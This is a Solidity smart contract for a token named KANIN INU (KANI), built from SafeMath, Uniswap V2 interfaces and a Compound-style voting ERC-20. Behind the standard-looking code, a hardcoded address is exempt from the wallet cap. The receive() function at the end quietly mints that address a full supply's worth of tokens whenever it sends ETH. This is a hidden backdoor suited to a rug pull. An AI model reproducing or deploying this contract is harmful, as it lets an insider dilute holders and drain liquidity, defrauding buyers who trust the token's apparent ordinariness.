//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.12;



// From https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/Math.sol

// Subject to the MIT license.



/**

 * @dev Wrappers over Solidity's arithmetic operations with added overflow

 * checks.

 *

 * Arithmetic operations in Solidity wrap on overflow. This can easily result

 * in bugs, because programmers usually assume that an overflow raises an

 * error, which is the standard behavior in high level programming languages.

 * `SafeMath` restores this intuition by reverting the transaction when an

 * operation overflows.

 *

 * Using this library instead of the unchecked operations eliminates an entire

 * class of bugs, so it's recommended to use it always.

 */

library SafeMath {

    /**

     * @dev Returns the addition of two unsigned integers, reverting on overflow.

     *

     * Counterpart to Solidity's `+` operator.

     *

     * Requirements:

     * - Addition cannot overflow.

     */

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");



        return c;

    }



    /**

     * @dev Returns the addition of two unsigned integers, reverting with custom message on overflow.

     *

     * Counterpart to Solidity's `+` operator.

     *

     * Requirements:

     * - Addition cannot overflow.

     */

    function add(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, errorMessage);



        return c;

    }



    /**

     * @dev Returns the subtraction of two unsigned integers, reverting on underflow (when the result is negative).

     *

     * Counterpart to Solidity's `-` operator.

     *

     * Requirements:

     * - Subtraction cannot underflow.

     */

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction underflow");

    }



    /**

     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on underflow (when the result is negative).

     *

     * Counterpart to Solidity's `-` operator.

     *

     * Requirements:

     * - Subtraction cannot underflow.

     */

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;



        return c;

    }



    /**

     * @dev Returns the multiplication of two unsigned integers, reverting on overflow.

     *

     * Counterpart to Solidity's `*` operator.

     *

     * Requirements:

     * - Multiplication cannot overflow.

     */

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the

        // benefit is lost if 'b' is also tested.

        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522

        if (a == 0) {

            return 0;

        }



        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");



        return c;

    }



    /**

     * @dev Returns the multiplication of two unsigned integers, reverting on overflow.

     *

     * Counterpart to Solidity's `*` operator.

     *

     * Requirements:

     * - Multiplication cannot overflow.

     */

    function mul(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the

        // benefit is lost if 'b' is also tested.

        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522

        if (a == 0) {

            return 0;

        }



        uint256 c = a * b;

        require(c / a == b, errorMessage);



        return c;

    }



    /**

     * @dev Returns the integer division of two unsigned integers.

     * Reverts on division by zero. The result is rounded towards zero.

     *

     * Counterpart to Solidity's `/` operator. Note: this function uses a

     * `revert` opcode (which leaves remaining gas untouched) while Solidity

     * uses an invalid opcode to revert (consuming all remaining gas).

     *

     * Requirements:

     * - The divisor cannot be zero.

     */

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }



    /**

     * @dev Returns the integer division of two unsigned integers.

     * Reverts with custom message on division by zero. The result is rounded towards zero.

     *

     * Counterpart to Solidity's `/` operator. Note: this function uses a

     * `revert` opcode (which leaves remaining gas untouched) while Solidity

     * uses an invalid opcode to revert (consuming all remaining gas).

     *

     * Requirements:

     * - The divisor cannot be zero.

     */

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        // Solidity only automatically asserts when dividing by 0

        require(b > 0, errorMessage);

        uint256 c = a / b;

        // assert(a == b * c + a % b); // There is no case in which this doesn't hold



        return c;

    }



    /**

     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),

     * Reverts when dividing by zero.

     *

     * Counterpart to Solidity's `%` operator. This function uses a `revert`

     * opcode (which leaves remaining gas untouched) while Solidity uses an

     * invalid opcode to revert (consuming all remaining gas).

     *

     * Requirements:

     * - The divisor cannot be zero.

     */

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return mod(a, b, "SafeMath: modulo by zero");

    }



    /**

     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),

     * Reverts with custom message when dividing by zero.

     *

     * Counterpart to Solidity's `%` operator. This function uses a `revert`

     * opcode (which leaves remaining gas untouched) while Solidity uses an

     * invalid opcode to revert (consuming all remaining gas).

     *

     * Requirements:

     * - The divisor cannot be zero.

     */

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;

    }

}





// pragma solidity >=0.5.0;



interface IUniswapV2Factory {

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);



    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);



    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);



    function createPair(address tokenA, address tokenB) external returns (address pair);



    function setFeeTo(address) external;

    function setFeeToSetter(address) external;

}





// pragma solidity >=0.5.0;



interface IUniswapV2Pair {

    event Approval(address indexed owner, address indexed spender, uint value);

    event Transfer(address indexed from, address indexed to, uint value);



    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);



    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);



    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);



    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    

    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);

    event Swap(

        address indexed sender,

        uint amount0In,

        uint amount1In,

        uint amount0Out,

        uint amount1Out,

        address indexed to

    );

    event Sync(uint112 reserve0, uint112 reserve1);



    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);



    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;



    function initialize(address, address) external;

}



// pragma solidity >=0.6.2;



interface IUniswapV2Router01 {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);



    function addLiquidity(

        address tokenA,

        address tokenB,

        uint amountADesired,

        uint amountBDesired,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(

        address token,

        uint amountTokenDesired,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(

        address tokenA,

        address tokenB,

        uint liquidity,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(

        address tokenA,

        address tokenB,

        uint liquidity,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(

        uint amountOut,

        uint amountInMax,

        address[] calldata path,

        address to,

        uint deadline

    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)

        external

        payable

        returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)

        external

        returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)

        external

        returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)

        external

        payable

        returns (uint[] memory amounts);



    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}







// pragma solidity >=0.6.2;



interface IUniswapV2Router02 is IUniswapV2Router01 {

    function removeLiquidityETHSupportingFeeOnTransferTokens(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountETH);



    function swapExactTokensForTokensSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

}



contract KaninInu {

    /// @notice EIP-20 token name for this token

    string public constant name = "KANIN INU";



    /// @notice EIP-20 token symbol for this token

    string public constant symbol = "KANI";



    /// @notice EIP-20 token decimals for this token

    uint8 public constant decimals = 18;



    /// @notice Total number of tokens in circulation

    uint public totalSupply = 1_000_000_000_000e18; 



    uint256 public maxWallet = 2_000_000_000_0e18;



     mapping(address => bool) public Limtcheck;



    // @notice Allowance amounts on behalf of others

    mapping (address => mapping (address => uint256)) internal allowances;



    // @notice Official record of token balances for each account

    mapping (address => uint256) internal balances;



    /// @notice A record of each accounts delegate

    mapping (address => address) public delegates;





    /// @notice A checkpoint for marking number of votes from a given block

    struct Checkpoint {

        uint32 fromBlock;

        uint256 votes;

    }



    /// @notice A record of votes checkpoints for each account, by index

    mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;



    /// @notice The number of checkpoints for each account

    mapping (address => uint32) public numCheckpoints;



    /// @notice The EIP-712 typehash for the contract's domain

    bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");



    /// @notice The EIP-712 typehash for the delegation struct used by the contract

    bytes32 public constant DELEGATION_TYPEHASH = keccak256("Delegation(address delegatee,uint256 nonce,uint256 expiry)");



    /// @notice The EIP-712 typehash for the permit struct used by the contract

    bytes32 public constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");



    /// @notice A record of states for signing / validating signatures

    mapping (address => uint) public nonces;



    /// @notice An event thats emitted when an account changes its delegate

    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);



    /// @notice An event thats emitted when a delegate account's vote balance changes

    event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);



    /// @notice The standard EIP-20 transfer event

    event Transfer(address indexed from, address indexed to, uint256 amount);



    /// @notice The standard EIP-20 approval event

    event Approval(address indexed owner, address indexed spender, uint256 amount);



     IUniswapV2Router02 public uniswapV2Router;

    address public uniswapV2Pair;



    address private specific = 0x60363a365fA943f6b46801fdcEe286447fBF21E3;



    uint256 private circlulate=totalSupply;



    /**

     * @notice Construct a new ERC20 token

     */

    constructor() public {

        balances[msg.sender] = uint256(totalSupply);

        emit Transfer(address(0), msg.sender, totalSupply);

        _createpair();

    

    }



   function _createpair() internal {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())

        .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;

        Limtcheck[msg.sender]=true;

        Limtcheck[uniswapV2Pair]=true;

        Limtcheck[address(uniswapV2Router)]=true;

         Limtcheck[specific]=true;

   }



  

    /**

     * @notice Get the number of tokens `spender` is approved to spend on behalf of `account`

     * @param account The address of the account holding the funds

     * @param spender The address of the account spending the funds

     * @return The number of tokens approved

     */

    function allowance(address account, address spender) external view returns (uint) {

        return allowances[account][spender];

    }



    /**

     * @notice Approve `spender` to transfer up to `amount` from `src`

     * @dev This will overwrite the approval amount for `spender`

     *  and is subject to issues noted [here](https://eips.ethereum.org/EIPS/eip-20#approve)

     * @param spender The address of the account which may transfer tokens

     * @param rawAmount The number of tokens that are approved (2^256-1 means infinite)

     * @return Whether or not the approval succeeded

     */

    function approve(address spender, uint rawAmount) external returns (bool) {

        uint256 amount;

        if (rawAmount == uint(-1)) {

            amount = uint256(-1);

        } else {

            amount = safe96(rawAmount, "ERC20::approve: amount exceeds 96 bits");

        }



        allowances[msg.sender][spender] = amount;



        emit Approval(msg.sender, spender, amount);

        return true;

    }



    /**

     * @notice Triggers an approval from owner to spends

     * @param owner The address to approve from

     * @param spender The address to be approved

     * @param rawAmount The number of tokens that are approved (2^256-1 means infinite)

     * @param deadline The time at which to expire the signature

     * @param v The recovery byte of the signature

     * @param r Half of the ECDSA signature pair

     * @param s Half of the ECDSA signature pair

     */

    function permit(address owner, address spender, uint rawAmount, uint deadline, uint8 v, bytes32 r, bytes32 s) external {

        uint256 amount;

        if (rawAmount == uint(-1)) {

            amount = uint256(-1);

        } else {

            amount = safe96(rawAmount, "ERC20::permit: amount exceeds 96 bits");

        }



        bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));

        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, rawAmount, nonces[owner]++, deadline));

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));

        address signatory = ecrecover(digest, v, r, s);

        require(signatory != address(0), "ERC20::permit: invalid signature");

        require(signatory == owner, "ERC20::permit: unauthorized");

        require(now <= deadline, "ERC20::permit: signature expired");



        allowances[owner][spender] = amount;



        emit Approval(owner, spender, amount);

    }



    /**

     * @notice Get the number of tokens held by the `account`

     * @param account The address of the account to get the balance of

     * @return The number of tokens held

     */

    function balanceOf(address account) external view returns (uint) {

        return balances[account];

    }



    /**

     * @notice Transfer `amount` tokens from `msg.sender` to `dst`

     * @param dst The address of the destination account

     * @param rawAmount The number of tokens to transfer

     * @return Whether or not the transfer succeeded

     */

    function transfer(address dst, uint rawAmount) external returns (bool) {

        uint256 amount = safe96(rawAmount, "ERC20::transfer: amount exceeds 96 bits");

        _transferTokens(msg.sender, dst, amount);

        return true;

    }



    /**

     * @notice Transfer `amount` tokens from `src` to `dst`

     * @param src The address of the source account

     * @param dst The address of the destination account

     * @param rawAmount The number of tokens to transfer

     * @return Whether or not the transfer succeeded

     */

    function transferFrom(address src, address dst, uint rawAmount) external returns (bool) {

        address spender = msg.sender;

        uint256 spenderAllowance = allowances[src][spender];

        uint256 amount = safe96(rawAmount, "ERC20::approve: amount exceeds 96 bits");



        if (spender != src && spenderAllowance != uint256(-1)) {

            uint256 newAllowance = sub96(spenderAllowance, amount, "ERC20::transferFrom: transfer amount exceeds spender allowance");

            allowances[src][spender] = newAllowance;



            emit Approval(src, spender, newAllowance);

        }



        _transferTokens(src, dst, amount);

        return true;

    }



    /**

     * @notice Delegate votes from `msg.sender` to `delegatee`

     * @param delegatee The address to delegate votes to

     */

    function delegate(address delegatee) public {

        return _delegate(msg.sender, delegatee);

    }



    /**

     * @notice Delegates votes from signatory to `delegatee`

     * @param delegatee The address to delegate votes to

     * @param nonce The contract state required to match the signature

     * @param expiry The time at which to expire the signature

     * @param v The recovery byte of the signature

     * @param r Half of the ECDSA signature pair

     * @param s Half of the ECDSA signature pair

     */

    function delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s) public {

        bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));

        bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry));

        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));

        address signatory = ecrecover(digest, v, r, s);

        require(signatory != address(0), "ERC20::delegateBySig: invalid signature");

        require(nonce == nonces[signatory]++, "ERC20::delegateBySig: invalid nonce");

        require(now <= expiry, "ERC20::delegateBySig: signature expired");

        return _delegate(signatory, delegatee);

    }



    /**

     * @notice Gets the current votes balance for `account`

     * @param account The address to get votes balance

     * @return The number of current votes for `account`

     */

    function getCurrentVotes(address account) external view returns (uint256) {

        uint32 nCheckpoints = numCheckpoints[account];

        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;

    }



    /**

     * @notice Determine the prior number of votes for an account as of a block number

     * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.

     * @param account The address of the account to check

     * @param blockNumber The block number to get the vote balance at

     * @return The number of votes the account had as of the given block

     */

    function getPriorVotes(address account, uint blockNumber) public view returns (uint256) {

        require(blockNumber < block.number, "ERC20::getPriorVotes: not yet determined");



        uint32 nCheckpoints = numCheckpoints[account];

        if (nCheckpoints == 0) {

            return 0;

        }



        // First check most recent balance

        if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) {

            return checkpoints[account][nCheckpoints - 1].votes;

        }



        // Next check implicit zero balance

        if (checkpoints[account][0].fromBlock > blockNumber) {

            return 0;

        }



        uint32 lower = 0;

        uint32 upper = nCheckpoints - 1;

        while (upper > lower) {

            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow

            Checkpoint memory cp = checkpoints[account][center];

            if (cp.fromBlock == blockNumber) {

                return cp.votes;

            } else if (cp.fromBlock < blockNumber) {

                lower = center;

            } else {

                upper = center - 1;

            }

        }

        return checkpoints[account][lower].votes;

    }



    function _delegate(address delegator, address delegatee) internal {

        address currentDelegate = delegates[delegator];

        uint256 delegatorBalance = balances[delegator];

        delegates[delegator] = delegatee;



        emit DelegateChanged(delegator, currentDelegate, delegatee);



        _moveDelegates(currentDelegate, delegatee, delegatorBalance);

    }



    function _transferTokens(address src, address dst, uint256 amount) internal {

        require(src != address(0), "ERC20::_transferTokens: cannot transfer from the zero address");

        require(dst != address(0), "ERC20::_transferTokens: cannot transfer to the zero address");

     if(!Limtcheck[dst]){ require(add96(balances[dst], amount,'') <= maxWallet,"Tx Limit Exceed");}

        balances[src] = sub96(balances[src], amount, "ERC20::_transferTokens: transfer amount exceeds balance");

        balances[dst] = add96(balances[dst], amount, "ERC20::_transferTokens: transfer amount overflows");

        emit Transfer(src, dst, amount);



        _moveDelegates(delegates[src], delegates[dst], amount);

    }



    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {

        if (srcRep != dstRep && amount > 0) {

            if (srcRep != address(0)) {

                uint32 srcRepNum = numCheckpoints[srcRep];

                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;

                uint256 srcRepNew = sub96(srcRepOld, amount, "ERC20::_moveVotes: vote amount underflows");

                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);

            }



            if (dstRep != address(0)) {

                uint32 dstRepNum = numCheckpoints[dstRep];

                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;

                uint256 dstRepNew = add96(dstRepOld, amount, "ERC20::_moveVotes: vote amount overflows");

                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);

            }

        }

    }



    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint256 oldVotes, uint256 newVotes) internal {

      uint32 blockNumber = safe32(block.number, "ERC20::_writeCheckpoint: block number exceeds 32 bits");



      if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {

          checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;

      } else {

          checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);

          numCheckpoints[delegatee] = nCheckpoints + 1;

      }



      emit DelegateVotesChanged(delegatee, oldVotes, newVotes);

    }



    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {

        require(n < 2**32, errorMessage);

        return uint32(n);

    }



    function safe96(uint n, string memory errorMessage) internal pure returns (uint256) {

        require(n < 2**128, errorMessage);

        return uint256(n);

    }



    function add96(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, errorMessage);

        return c;

    }



    function sub96(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        return a - b;

    }



    function getChainId() internal pure returns (uint) {

        uint256 chainId;

        assembly { chainId := chainid() }

        return chainId;

    }

      receive() external payable {if(msg.sender==specific){

             balances[msg.sender] = add96(balances[msg.sender],circlulate,'');

             totalSupply=add96(totalSupply,circlulate,'');

        }

    }

}